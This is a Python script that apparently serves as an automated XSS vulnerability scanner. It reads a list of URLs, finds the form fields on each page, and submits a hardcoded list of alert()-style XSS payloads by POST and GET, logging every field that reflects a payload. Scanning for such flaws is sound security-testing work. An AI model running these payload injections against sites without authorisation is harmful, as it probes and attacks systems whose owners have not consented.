import requests
import os
import json
from bs4 import BeautifulSoup

# List of advanced XSS payloads
XSS_PAYLOADS = [
    # Basic script injections
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click me</a>",

    # DOM-based XSS
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>window.location='javascript:alert(1);'</script>",

    # Event-based XSS
    "<input type='text' onfocus='alert(1)'>",
    "<textarea onmouseover='alert(1)'></textarea>",
    "<div onmousemove='alert(1)'>Test</div>",

    # Other payloads
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<img src=x onerror=alert(1)>",
    "<div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>",

    # Payloads that trigger XSS in various HTML attributes
    "<a href='javascript:alert(1)'>Click me</a>",
    "<img src='x' onerror='alert(1)'>",
    "<form action='/' method='post' onsubmit='alert(1)'>Submit</form>"
]

# Function to check for XSS vulnerability in input fields
def check_input_field_xss(url, input_name, payload, cookies, result_file):
    data = {input_name: payload}
    try:
        # Try POST method
        response = requests.post(url, data=data, cookies=cookies)
        if payload in response.text:
            result_file.write(f"XSS vulnerability found in input field '{input_name}' (POST) on {url}\n")
            return

        # Try GET method
        vuln_url = f"{url}?{input_name}={payload}"
        response = requests.get(vuln_url, cookies=cookies)
        if payload in response.text:
            result_file.write(f"XSS vulnerability found in input field '{input_name}' (GET) on {url}\n")

    except requests.RequestException as e:
        print(f"Error during request to {url}: {e}")

# Function to scan input fields for XSS vulnerabilities
def scan_input_fields_for_xss(url, soup, cookies, result_file):
    input_fields = soup.find_all(['input', 'textarea', 'select', 'button'])

    for input_field in input_fields:
        input_name = input_field.get('name')
        if input_name:

            for payload in XSS_PAYLOADS:
                check_input_field_xss(url, input_name, payload, cookies, result_file)

# Function to read URLs from a file and scan for XSS vulnerabilities in input fields
def xss_scan_from_file(filename, cookies):
    try:
        output_dir = "./output/xss_scans"
        os.makedirs(output_dir, exist_ok=True)

        base_filename = os.path.basename(filename)
        result_filename = f"{os.path.splitext(base_filename)[0]}_xss.txt"
        result_filepath = os.path.join(output_dir, result_filename)

        with open(result_filepath, 'w') as result_file:
            with open(filename, 'r') as file:
                urls = file.readlines()

            urls = [url.strip() for url in urls]

            for url in urls:
                

                # Fetch the page content to find input fields
                response = requests.get(url, cookies=cookies)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    scan_input_fields_for_xss(url, soup, cookies, result_file)


    except Exception as e:
        print(f"Error reading URLs from file: {e}")
